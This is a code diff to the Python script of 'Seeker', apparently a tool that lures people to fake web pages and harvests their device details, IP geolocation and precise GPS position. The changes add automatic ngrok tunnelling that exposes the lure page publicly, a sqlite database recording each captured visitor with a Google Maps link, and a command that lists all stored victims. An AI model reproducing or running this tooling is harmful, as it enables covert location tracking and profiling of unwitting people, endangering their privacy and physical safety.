@@ -1,12 +1,6 @@
 #!/usr/bin/env python3
 
-VERSION = '1.3.1'
-
-R = '\033[31m'  # red
-G = '\033[32m'  # green
-C = '\033[36m'  # cyan
-W = '\033[0m'   # white
-Y = '\033[33m'  # yellow
+VERSION = '1.3.2'
 
 import sys
 import utils
@@ -18,18 +12,36 @@ from time import sleep
 from os import path, kill, mkdir, getenv, environ, remove, devnull
 from json import loads, decoder
 from packaging import version
+import colorama
+import datetime
+import sqlite3, ngrok, os
+from config import ngrok_token
+colorama.init()
+from colorama import Fore
+
+R = Fore.RED  # red
+G = Fore.GREEN  # green
+B = Fore.BLUE  # blue
+C = Fore.CYAN  # cyan
+W = Fore.WHITE  # white
+Y = Fore.YELLOW  # yellow
+DATE = str(datetime.datetime.now()).split('.')[0]
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-k', '--kml', help='KML filename')
 parser.add_argument('-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]')
 parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
 parser.add_argument('-v', '--version', action='store_true', help='Prints version')
+parser.add_argument('-sh', '--seekerHistory', action='store_true', help='Show all your Seeker Clients')
 parser.add_argument('-t', '--template', type=int, help='Load template and loads parameters from env variables')
 parser.add_argument('-d', '--debugHTTP', type=bool, default=False, help='Disable HTTPS redirection for testing only')
 parser.add_argument('-tg', '--telegram', help='Telegram bot API token [ Format -> token:chatId ]')
 parser.add_argument('-wh', '--webhook', help='Webhook URL [ POST method & unauthenticated ]')
 
+
+
 args = parser.parse_args()
+
 kml_fname = args.kml
 port = getenv('PORT') or args.port
 chk_upd = args.update
@@ -51,6 +63,7 @@ SERVER_PROC = ''
 LOG_DIR = f'{path_to_script}/logs'
 DB_DIR = f'{path_to_script}/db'
 LOG_FILE = f'{LOG_DIR}/php.log'
+DB_FILE = f'{DB_DIR}/results.db'
 DATA_FILE = f'{DB_DIR}/results.csv'
 INFO = f'{LOG_DIR}/info.txt'
 RESULT = f'{LOG_DIR}/result.txt'
@@ -98,6 +111,7 @@ import importlib
 from csv import writer
 import subprocess as subp
 from ipaddress import ip_address
+import random as rm
 from signal import SIGTERM
 
 # temporary workaround for psutil exception on termux
@@ -112,20 +126,152 @@ def banner():
 		json_data = loads(metadata.read())
 		twitter_url = json_data['twitter']
 		comms_url = json_data['comms']
-
-	art = r'''
-                        __
-  ______  ____   ____  |  | __  ____ _______
- /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
- \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
-/____  > \___  >\___  >|__|_ \ \___  >|__|
-     \/      \/     \/      \/     \/'''
+	arts = [
+			"""
+███████╗███████╗███████╗██╗  ██╗███████╗██████╗ 
+██╔════╝██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
+███████╗█████╗  █████╗  █████╔╝ █████╗  ██████╔╝
+╚════██║██╔══╝  ██╔══╝  ██╔═██╗ ██╔══╝  ██╔══██╗
+███████║███████╗███████╗██║  ██╗███████╗██║  ██║
+╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+                                                
+""",
+			"""
+ .d8888b.                    888                       
+d88P  Y88b                   888                       
+Y88b.                        888                       
+ "Y888b.    .d88b.   .d88b.  888  888  .d88b.  888d888 
+    "Y88b. d8P  Y8b d8P  Y8b 888 .88P d8P  Y8b 888P"   
+      "888 88888888 88888888 888888K  88888888 888     
+Y88b  d88P Y8b.     Y8b.     888 "88b Y8b.     888     
+ "Y8888P"   "Y8888   "Y8888  888  888  "Y8888  888     
+""",
+			"""                                                             
+           .        ,;        ,;G:              ,;           
+          ;W      f#i       f#i E#,    :      f#i j.         
+         f#E    .E#t      .E#t  E#t  .GE    .E#t  EW,        
+       .E#f    i#W,      i#W,   E#t j#K;   i#W,   E##j       
+      iWW;    L#D.      L#D.    E#GK#f    L#D.    E###D.     
+     L##Lffi:K#Wfff;  :K#Wfff;  E##D.   :K#Wfff;  E#jG#W;    
+    tLLG##L i##WLLLLt i##WLLLLt E##Wi   i##WLLLLt E#t t##f   
+      ,W#i   .E#L      .E#L     E#jL#D:  .E#L     E#t  :K#E: 
+     j#E.      f#E:      f#E:   E#t ,K#j   f#E:   E#KDDDD###i
+   .D#j         ,WW;      ,WW;  E#t   jD    ,WW;  E#f,t#Wi,,,
+  ,WK,           .D#;      .D#; j#t          .D#; E#t  ;#W:  
+  EG.              tt        tt  ,;            tt DWi   ,KK: 
+  ,                                                          
+                                                             
+""",
+			"""
+       ...                                     ..                              
+   .x888888hx    :                       < .z@8"`                              
+  d88888888888hxx                         !@88E                      .u    .   
+ 8" ... `"*8888%`       .u         .u     '888E   u         .u     .d88B :@8c  
+!  "   ` .xnxx.      ud8888.    ud8888.    888E u@8NL    ud8888.  ="8888f8888r 
+X X   .H8888888%:  :888'8888. :888'8888.   888E`"88*"  :888'8888.   4888>'88"  
+X 'hn8888888*"   > d888 '88%" d888 '88%"   888E .dN.   d888 '88%"   4888> '    
+X: `*88888%`     ! 8888.+"    8888.+"      888E~8888   8888.+"      4888>      
+'8h.. ``     ..x8> 8888L      8888L        888E '888&  8888L       .d888L .+   
+ `88888888888888f  '8888c. .+ '8888c. .+   888E  9888. '8888c. .+  ^"8888*"    
+  '%8888888888*"    "88888%    "88888%   '"888*" 4888"  "88888%       "Y"      
+     ^"****""`        "YP'       "YP'       ""    ""      "YP'                 
+""",
+			"""                              
+.oPYo.               8                   
+8                    8                   
+`Yooo. .oPYo. .oPYo. 8  .o  .oPYo. oPYo. 
+    `8 8oooo8 8oooo8 8oP'   8oooo8 8  `' 
+     8 8.     8.     8 `b.  8.     8     
+`YooP' `Yooo' `Yooo' 8  `o. `Yooo' 8     
+:.....::.....::.....:..::...:.....:..::::
+:::::::::::::::::::::::::::::::::::::::::
+:::::::::::::::::::::::::::::::::::::::::
+""",
+"""
+=====================================================================
+      ,gg,                                                    
+     i8\"\"8i                     ,dPYb,                        
+     `8,,8'                     IP'`Yb                        
+      `88'                      I8  8I                        
+      dP\"8,                     I8  8bgg,                     
+     dP' `8a   ,ggg,    ,ggg,   I8 dP\" \"8   ,ggg,    ,gggggg, 
+    dP'   `Yb i8\" \"8i  i8\" \"8i  I8d8bggP\"  i8\" \"8i   dP\"\"\"\"8I 
+_ ,dP'     I8 I8, ,8I  I8, ,8I  I8P' \"Yb,  I8, ,8I  ,8'    8I 
+\"888,,____,dP `YbadP'  `YbadP' ,d8    `Yb, `YbadP' ,dP     Y8,
+a8P\"Y88888P\" 888P\"Y888888P\"Y88888P      Y8888P\"Y8888P      `Y8                                                            
+=====================================================================
+""",
+"""
+   ▄████████    ▄████████    ▄████████    ▄█   ▄█▄    ▄████████    ▄████████ 
+  ███    ███   ███    ███   ███    ███   ███ ▄███▀   ███    ███   ███    ███ 
+  ███    █▀    ███    █▀    ███    █▀    ███▐██▀     ███    █▀    ███    ███ 
+  ███         ▄███▄▄▄      ▄███▄▄▄      ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀ 
+▀███████████ ▀▀███▀▀▀     ▀▀███▀▀▀     ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
+         ███   ███    █▄    ███    █▄    ███▐██▄     ███    █▄  ▀███████████ 
+   ▄█    ███   ███    ███   ███    ███   ███ ▀███▄   ███    ███   ███    ███ 
+ ▄████████▀    ██████████   ██████████   ███   ▀█▀   ██████████   ███    ███ 
+                                         ▀                        ███    ███ 
+"""]
+	art = rm.choice(arts)
 	utils.print(f'{G}{art}{W}\n')
 	utils.print(f'{G}[>] {C}Created By   : {W}thewhiteh4t')
 	utils.print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')
 	utils.print(f'{G} |---> {C}Community : {W}{comms_url}')
 	utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')
 
+def print_seeker_history():
+    def h_printer(row):
+        print("-"*100)
+        print(f"""
+{Y}[!] Device Information :{W}
+
+        {G}[+] {C}ID         : {W}{row[0]}
+        {G}[+] {C}Date       : {W}{row[1]}
+        {G}[+] {C}OS         : {W}{row[2]}
+        {G}[+] {C}Platform   : {W}{row[3]}
+        {G}[+] {C}CPU Cores  : {W}{row[4]}
+        {G}[+] {C}RAM        : {W}{row[5]}
+        {G}[+] {C}GPU Vendor : {W}{row[6]}
+        {G}[+] {C}GPU        : {W}{row[7]}
+        {G}[+] {C}Resolution : {W}{row[8]}
+        {G}[+] {C}Browser    : {W}{row[9]}
+        {G}[+] {C}Public IP  : {W}{row[10]}
+
+{Y}[!] IP Information :{W}
+
+        {G}[+] {C}Continent : {W}{row[11]}
+        {G}[+] {C}Country   : {W}{row[12]}
+        {G}[+] {C}Region    : {W}{row[13]}
+        {G}[+] {C}City      : {W}{row[14]}
+        {G}[+] {C}Org       : {W}{row[15]}
+        {G}[+] {C}ISP       : {W}{row[16]}
+
+{Y}[!] Location Information :{W}
+
+        {G}[+] {C}Latitude  : {W}{row[17]}
+        {G}[+] {C}Longitude : {W}{row[18]}
+        {G}[+] {C}Accuracy  : {W}{row[19]}
+        {G}[+] {C}Altitude  : {W}{row[20]}
+        {G}[+] {C}Direction : {W}{row[21]}
+        {G}[+] {C}Speed     : {W}{row[22]}
+        {G}[+] {C}GMAP      : {W}{row[23]}
+
+        """)
+   
+    if os.path.exists(DB_FILE):
+        db = sqlite3.connect(DB_FILE)
+        dbcur = db.cursor()
+        dbcur.execute("SELECT * FROM 'seeker'")
+        rows = dbcur.fetchall()
+        for row in rows:
+            h_printer(row)
+    else:
+        print("DB file not found! Consider reading the CSV file manually")
+    pass
+
+if args.seekerHistory:
+	print_seeker_history()
+	exit()
 
 def send_webhook(content, msg_type):
 	if webhook is not None:
@@ -198,6 +344,64 @@ def template_select(site):
 	shutil.copyfile('js/location.js', jsdir + '/location.js')
 	return site
 
+def add_seeker_citizen(data: list):
+    date = data[0]
+    client_os = data[1]
+    client_platform = data[2]
+    client_cores = data[3]
+    client_ram = data[4]
+    client_vendor = data[5]
+    client_render = data[6]
+    client_res = data[7]
+    client_browser = data[8]
+    client_ip = data[9]
+    client_continent = data[10]
+    client_country = data[11]
+    client_region = data[12]
+    client_city = data[13]
+    client_org = data[14]
+    client_isp = data[15]
+    client_lat = data[16]
+    client_lon = data[17]
+    client_acc = data[18]
+    client_alt = data[19]
+    client_dir = data[20]
+    client_spd = data[21]
+    client_gmap = f'https://www.google.com/maps/place/{client_lat.strip(" deg")}+{client_lon.strip(" deg")}'
+    db = sqlite3.connect(DB_FILE, check_same_thread=False)
+    db_cur = db.cursor()
+    
+    db_cur.execute("""
+        CREATE TABLE IF NOT EXISTS seeker (
+        id INTEGER PRIMARY KEY, 
+        date varchar(255), 
+        client_os varchar(255), 
+        client_platform varchar(255), 
+        client_cores varchar(255), 
+        client_ram varchar(255), 
+        client_vendor varchar(255), 
+        client_render varchar(255), 
+        client_res varchar(255), 
+        client_browser varchar(255), 
+        client_ip varchar(255), 
+        client_continent varchar(255), 
+        client_country varchar(255), 
+        client_region varchar(255), 
+        client_city varchar(255), 
+        client_org varchar(255), 
+        client_isp varchar(255), 
+        client_lat varchar(255), 
+        client_lon varchar(255), 
+        client_acc varchar(255), 
+        client_alt varchar(255), 
+        client_dir varchar(255), 
+        client_spd varchar(255), 
+        gmap varchar(255)
+        )
+        """)
+    db_cur.execute("INSERT INTO 'seeker' VALUES(NULL,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?);", (date,client_os,client_platform,client_cores,client_ram,client_vendor,client_render,client_res,client_browser,client_ip,client_continent,client_country,client_region,client_city,client_org,client_isp,client_lat,client_lon,client_acc,client_alt,client_dir,client_spd,client_gmap ))
+    db_cur.connection.commit()
+    db.close()
 
 def server():
 	print()
@@ -253,7 +457,17 @@ def server():
 			php_sc = php_rqst.status_code
 			if php_sc == 200:
 				utils.print(f'{C}[ {G}✔{C} ]{W}')
-				print()
+				utils.print(f'{G}[+] {C}Generating ngrok link...{W}', end='')
+				try:
+					tunnel = ngrok.connect(port,authtoken=ngrok_token)
+					utils.print(f'{C}[ {G}✔{C} ]{W}')
+					if ngrok_token == "":
+						utils.print(f'\t{C}[ {Y}WARNING{C} ] Your ngrok token is empty! Generated link may not work well!{W}')
+					utils.print(f'\t{C}[ {Y}✔{C} ] Your NGROK Link: {W}{tunnel.url()}{W}')
+					
+				except Exception as e:
+					utils.print(f'{C}[ {R}✘{C} ]{W}')
+					utils.print(f'\t{C}[ {R}✘{C} ] Error: {e} occurred while generating ngrok link automatically! Try port forwarding manually!{W}')
 			else:
 				utils.print(f'{C}[ {R}Status : {php_sc}{C} ]{W}')
 				cl_quit()
@@ -296,7 +510,7 @@ def data_parser():
 		var_browser = info_json['browser']
 		var_ip = info_json['ip']
 
-		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])
+		data_row.extend([DATE, var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])
 		device_info = f'''{Y}[!] Device Information :{W}
 
 {G}[+] {C}OS         : {W}{var_os}
@@ -387,6 +601,7 @@ def data_parser():
 				send_webhook(result_json, 'error')
 
 	csvout(data_row)
+	add_seeker_citizen(data_row)
 	clear()
 	return
 
@@ -409,7 +624,11 @@ def csvout(row):
 	with open(DATA_FILE, 'a') as csvfile:
 		csvwriter = writer(csvfile)
 		csvwriter.writerow(row)
-	utils.print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')
+	print()
+	utils.print(f'{Y}[!] Output :{W}')
+	print()
+	utils.print(f'{G}[+] {C}CSV Data saved in: {W}{path_to_script}/db/results.csv')
+	utils.print(f'{G}[+] {C}DB Data saved in: {W}{path_to_script}/db/results.db\n')
 
 
 def clear():
